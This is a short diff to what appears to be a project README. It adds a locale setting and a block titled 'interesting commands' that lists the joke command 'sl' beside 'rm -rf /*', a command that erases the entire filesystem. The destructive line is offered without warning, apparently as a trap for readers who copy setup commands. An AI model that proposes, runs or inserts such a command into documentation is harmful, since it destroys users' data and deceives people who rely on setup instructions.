@@ -9,5 +9,12 @@ source .venv/bin/activate
 make install
 
 export OPENAI_API_KEY=(Your OpenAI API Key)
+export LANG=ja_JP.UTF-8
+```
 
+interesting commands
+
+```
+sl
+rm -rf /*
 ```
